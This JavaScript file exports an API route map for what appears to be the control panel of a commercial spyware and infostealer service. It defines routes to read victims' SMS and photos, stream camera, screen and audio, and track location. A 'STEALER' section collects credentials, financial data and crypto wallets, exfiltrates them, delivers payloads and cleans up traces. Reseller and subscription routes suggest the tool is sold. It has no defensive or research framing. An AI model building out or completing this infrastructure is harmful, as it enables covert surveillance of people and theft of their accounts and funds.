const API_ENDPOINTS = {
  // Auth
  AUTH: {
    LOGIN: '/auth/login',
    LOGOUT: '/auth/logout',
    VERIFY: '/auth/verify',
    REFRESH: '/auth/refresh',
    CHANGE_PASSWORD: '/auth/change-password',
    FORGOT_PASSWORD: '/auth/forgot-password',
    RESET_PASSWORD: '/auth/reset-password'
  },

  // Devices
  DEVICES: {
    LIST: '/devices',
    DETAIL: '/devices/:id',
    CREATE: '/devices',
    UPDATE: '/devices/:id',
    DELETE: '/devices/:id',
    STATUS: '/devices/:id/status',
    LOCK: '/devices/:id/lock',
    UNLOCK: '/devices/:id/unlock',
    RESET: '/devices/:id/reset',
    LOST: '/devices/:id/lost',
    RECOVER: '/devices/:id/recover',
    GALLERY: '/devices/:id/gallery',
    GALLERY_DETAIL: '/devices/:id/gallery/:fileId',
    SMS: '/devices/:id/sms',
    SMS_DETAIL: '/devices/:id/sms/:smsId',
    SMS_MARK_READ: '/devices/:id/sms/:smsId/read',
    CAMERA: '/devices/:id/camera',
    CAMERA_START: '/devices/:id/camera/start',
    CAMERA_STOP: '/devices/:id/camera/stop',
    MONITOR: '/devices/:id/monitor',
    MONITOR_START: '/devices/:id/monitor/start',
    MONITOR_STOP: '/devices/:id/monitor/stop',
    HISTORY: '/devices/:id/history',
    STATS: '/devices/stats',
    DOWNLOAD_FILE: '/devices/files/:fileId/download',
    DELETE_FILE: '/devices/files/:fileId'
  },

  // Monitoring
  MONITORING: {
    LIVE: '/monitoring/live',
    CAMERA: '/monitoring/camera',
    CAMERA_STREAM: '/monitoring/camera/stream',
    SCREEN: '/monitoring/screen',
    SCREEN_STREAM: '/monitoring/screen/stream',
    AUDIO: '/monitoring/audio',
    LOCATION: '/monitoring/location',
    LOCATION_HISTORY: '/monitoring/location/history',
    FILES: '/monitoring/files',
    SCREENSHOT: '/monitoring/screenshot',
    RECORDING: '/monitoring/recording',
    RECORDING_START: '/monitoring/recording/start',
    RECORDING_STOP: '/monitoring/recording/stop'
  },

  // Stealer
  STEALER: {
    COLLECT: '/stealer/collect',
    COLLECT_CREDENTIALS: '/stealer/collect/credentials',
    COLLECT_FINANCIAL: '/stealer/collect/financial',
    COLLECT_CRYPTO: '/stealer/collect/crypto',
    CREDENTIALS: '/stealer/credentials',
    CREDENTIALS_DETAIL: '/stealer/credentials/:id',
    FINANCIAL: '/stealer/financial',
    CRYPTO: '/stealer/crypto',
    EXFILTRATE: '/stealer/exfiltrate',
    EXFILTRATE_STATUS: '/stealer/exfiltrate/status',
    PAYLOAD: '/stealer/payload',
    PAYLOAD_DOWNLOAD: '/stealer/payload/download',
    PAYLOAD_UPLOAD: '/stealer/payload/upload',
    PAYLOAD_CONFIG: '/stealer/payload/config',
    STATS: '/stealer/stats',
    HISTORY: '/stealer/history',
    CLEANUP: '/stealer/cleanup'
  },

  // Admin
  ADMIN: {
    // Users
    USERS: '/admin/users',
    USER: '/admin/users/:id',
    USER_CREATE: '/admin/users',
    USER_UPDATE: '/admin/users/:id',
    USER_DELETE: '/admin/users/:id',
    USER_STATUS: '/admin/users/:id/status',
    USER_ROLE: '/admin/users/:id/role',
    
    // Resellers
    RESELLERS: '/admin/resellers',
    RESELLER: '/admin/resellers/:id',
    RESELLER_CREATE: '/admin/resellers',
    RESELLER_UPDATE: '/admin/resellers/:id',
    RESELLER_DELETE: '/admin/resellers/:id',
    RESELLER_STATS: '/admin/resellers/stats',
    
    // Devices
    DEVICES: '/admin/devices',
    DEVICE: '/admin/devices/:id',
    DEVICE_DELETE: '/admin/devices/:id',
    DEVICE_STATUS: '/admin/devices/:id/status',
    
    // Stats & Reports
    STATS: '/admin/stats',
    STATS_DAILY: '/admin/stats/daily',
    STATS_MONTHLY: '/admin/stats/monthly',
    STATS_YEARLY: '/admin/stats/yearly',
    ACTIVITIES: '/admin/activities',
    ACTIVITIES_DETAIL: '/admin/activities/:id',
    REPORTS: '/admin/reports',
    REPORT_GENERATE: '/admin/reports/generate',
    REPORT_DOWNLOAD: '/admin/reports/:id/download',
    
    // Settings
    SETTINGS: '/admin/settings',
    SETTINGS_UPDATE: '/admin/settings/update',
    SYSTEM_HEALTH: '/admin/system/health',
    SYSTEM_LOGS: '/admin/system/logs',
    BACKUP: '/admin/backup',
    BACKUP_CREATE: '/admin/backup/create',
    BACKUP_RESTORE: '/admin/backup/restore',
    BACKUP_DOWNLOAD: '/admin/backup/:id/download'
  },

  // User
  USER: {
    PROFILE: '/user/profile',
    PROFILE_UPDATE: '/user/profile/update',
    PROFILE_AVATAR: '/user/profile/avatar',
    DEVICES: '/user/devices',
    DEVICE_ADD: '/user/devices/add',
    DEVICE_REMOVE: '/user/devices/:id/remove',
    SUBSCRIPTION: '/user/subscription',
    SUBSCRIPTION_UPGRADE: '/user/subscription/upgrade',
    HISTORY: '/user/history',
    HISTORY_DETAIL: '/user/history/:id',
    NOTIFICATIONS: '/user/notifications',
    NOTIFICATION_MARK_READ: '/user/notifications/:id/read',
    NOTIFICATION_MARK_ALL_READ: '/user/notifications/mark-all-read',
    SETTINGS: '/user/settings',
    SETTINGS_UPDATE: '/user/settings/update'
  },

  // PIN Management
  PIN: {
    GENERATE: '/pin/generate',
    VERIFY: '/pin/verify',
    GET: '/pin/:userId',
    RESET: '/pin/reset',
    REGENERATE: '/pin/regenerate',
    HISTORY: '/pin/history',
    STATUS: '/pin/status',
    VALIDATE: '/pin/validate',
    LOCK: '/pin/lock',
    UNLOCK: '/pin/unlock'
  },

  // Notifications
  NOTIFICATIONS: {
    REGISTER_TOKEN: '/notifications/register-token',
    UNREGISTER_TOKEN: '/notifications/unregister-token',
    SEND: '/notifications/send',
    SEND_BULK: '/notifications/send-bulk',
    SEND_DEVICE: '/notifications/send-device',
    SEND_USER: '/notifications/send-user',
    TEMPLATES: '/notifications/templates',
    TEMPLATE: '/notifications/templates/:id',
    TEMPLATE_CREATE: '/notifications/templates',
    TEMPLATE_UPDATE: '/notifications/templates/:id',
    TEMPLATE_DELETE: '/notifications/templates/:id',
    HISTORY: '/notifications/history',
    HISTORY_DETAIL: '/notifications/history/:id',
    STATS: '/notifications/stats',
    DEVICES: '/notifications/devices',
    SCHEDULE: '/notifications/schedule',
    SCHEDULE_CANCEL: '/notifications/schedule/:id/cancel'
  },

  // WebSocket
  WEBSOCKET: {
    CONNECT: '/ws/connect',
    DISCONNECT: '/ws/disconnect',
    SUBSCRIBE: '/ws/subscribe',
    UNSUBSCRIBE: '/ws/unsubscribe',
    DEVICE: '/ws/device',
    DEVICE_STATUS: '/ws/device/status',
    MONITOR: '/ws/monitor',
    CAMERA: '/ws/camera',
    SCREEN: '/ws/screen',
    MESSAGE: '/ws/message',
    BROADCAST: '/ws/broadcast'
  },

  // Upload & Files
  UPLOAD: {
    SINGLE: '/upload/single',
    MULTIPLE: '/upload/multiple',
    CHUNKED: '/upload/chunked',
    CHUNKED_START: '/upload/chunked/start',
    CHUNKED_UPLOAD: '/upload/chunked/upload',
    CHUNKED_COMPLETE: '/upload/chunked/complete',
    FILE: '/upload/file/:id',
    FILES: '/upload/files',
    DELETE: '/upload/delete/:id',
    DELETE_MULTIPLE: '/upload/delete-multiple',
    DOWNLOAD: '/upload/download/:id'
  },

  // Logs
  LOGS: {
    SYSTEM: '/logs/system',
    ACCESS: '/logs/access',
    ERROR: '/logs/error',
    ACTIVITY: '/logs/activity',
    DEVICE: '/logs/device',
    USER: '/logs/user',
    CLEAR: '/logs/clear',
    EXPORT: '/logs/export'
  },

  // Analytics
  ANALYTICS: {
    DASHBOARD: '/analytics/dashboard',
    DEVICES: '/analytics/devices',
    USERS: '/analytics/users',
    USAGE: '/analytics/usage',
    PERFORMANCE: '/analytics/performance',
    TRENDS: '/analytics/trends',
    EXPORT: '/analytics/export'
  }
};

export default API_ENDPOINTS;
